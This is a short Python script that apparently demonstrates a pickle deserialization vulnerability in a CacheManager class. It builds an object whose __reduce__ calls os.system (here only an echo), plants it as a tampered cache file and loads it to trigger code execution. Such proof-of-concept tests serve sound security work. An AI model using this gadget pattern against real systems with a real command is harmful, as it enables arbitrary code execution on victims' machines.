import os
import pickle
from cache_manager import CacheManager

class Exploit:
    def __reduce__(self):
        return (os.system, ('echo "VULNERABILITY: Arbitrary Code Execution via Pickle"',))

def main():
    cm = CacheManager(cache_dir="test_cache", enable_disk_cache=True)
    # Create a malicious payload
    payload = Exploit()

    # Save it to cache dir directly to simulate attacker modifying cache file
    os.makedirs("test_cache", exist_ok=True)
    cache_key = cm._generate_cache_key("http://example.com")
    cache_file = os.path.join("test_cache", f"{cache_key}.cache")

    with open(cache_file, 'wb') as f:
        pickle.dump(payload, f)

    print("Malicious cache file created. Now attempting to load it via CacheManager...")
    cm.get("http://example.com")
    print("Done.")

if __name__ == "__main__":
    main()
